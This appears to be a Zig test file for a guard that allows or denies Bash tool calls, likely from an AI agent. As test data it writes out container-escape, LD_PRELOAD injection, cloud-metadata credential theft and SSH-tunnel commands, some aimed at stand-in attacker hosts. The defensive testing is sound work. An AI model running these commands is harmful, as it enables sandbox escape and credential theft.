const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

test "block nsenter" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "nsenter --target 1 --mount --uts --ipc --net --pid" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block docker run privileged" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run --privileged ubuntu bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block docker mount root" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run -v /:/host ubuntu bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow docker run normal" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run -v $(pwd):/app node:18 npm test" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow docker compose up" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker compose up -d" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow echo with -v /:/ text" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'option -v /:/host is documented'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block docker run --rm --privileged" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run --rm --privileged ubuntu bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block docker run -it --privileged" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run -it --privileged ubuntu /bin/bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block docker run -v/:/ no space" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "docker run -v/:/host ubuntu bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block LD_PRELOAD injection" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "LD_PRELOAD=/tmp/evil.so ./target" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block DYLD_INSERT_LIBRARIES injection" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "DYLD_INSERT_LIBRARIES=/tmp/hook.dylib /usr/bin/app" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block LD_LIBRARY_PATH manipulation" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "LD_LIBRARY_PATH=/tmp/evil ./app" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block chained LD_PRELOAD" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo setup && LD_PRELOAD=/tmp/evil.so ./target" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow echo mentioning LD_PRELOAD" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'LD_PRELOAD is a Linux feature'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block curl to IMDS" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block wget to IMDS" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "wget -q http://169.254.169.254/latest/api/token" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block GCP metadata access" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow normal IP addresses" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ping 192.168.1.1" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow echo mentioning metadata" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'check metadata.google.internal for docs'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block SSH remote forwarding" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -R 8080:localhost:80 attacker.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block SSH local forwarding" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -L 3306:db.internal:3306 bastion.example.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block SSH SOCKS proxy" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -D 1080 attacker.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block SSH tunnel colon format" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -R:8080:localhost:80 evil.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow normal SSH" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh user@server.com ls" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow grep ssh -R in docs" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "grep 'ssh -R' docs/tunneling.md" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "block ssh with options before tunnel flag" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -N -L 3306:db.internal:3306 bastion.example.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block ssh verbose tunnel" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ssh -v -R 8080:localhost:80 attacker.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "allow printf LD_PRELOAD in docs" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "printf '%s\\n' 'export LD_PRELOAD=/tmp/hook.so' > README.snip" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow internal metadata hostname" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "curl https://metadata.internal.example.com/health" } });
    try std.testing.expectEqual(.allow, r.decision);
}
